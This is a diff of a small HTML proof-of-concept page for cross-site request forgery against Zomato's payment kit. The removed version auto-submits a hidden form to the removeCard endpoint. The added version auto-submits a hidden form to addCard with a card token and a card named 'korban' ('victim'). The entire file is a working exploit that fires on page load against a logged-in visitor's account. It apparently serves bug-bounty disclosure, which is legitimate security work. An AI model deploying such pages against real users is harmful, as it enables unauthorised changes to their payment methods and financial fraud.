@@ -1,14 +1,19 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CSRF PoC - addCard</title>
+</head>
 <body>
-<h3>CSRF PoC - removeCard</h3>
-<form action="https://www.zomato.com/zpaykit/removeCard" method="POST" enctype="multipart/form-data">
-  <input type="hidden" name="serviceType" value="DELIVERY" />
-  <input type="hidden" name="cardId" value="263513349" />
-  <input type="submit" value="Submit request" />
-</form>
-<script>
-  document.forms[0].submit();
-</script>
+  <h3>CSRF PoC: zpaykit/addCard</h3>
+  <form id="csrf-poc" action="https://www.zomato.com/zpaykit/addCard" method="POST">
+    <input type="hidden" name="vault" value="winecellar">
+    <input type="hidden" name="country_id" value="1">
+    <input type="hidden" name="service_type" value="TR">
+    <input type="hidden" name="card_name" value="korban">
+    <input type="hidden" name="card_token" value="tTQ6K2nCNKXq1vPDk2NY1vwOlRySey97">
+  </form>
+  <script>
+    document.getElementById('csrf-poc').submit();
+  </script>
 </body>
 </html>
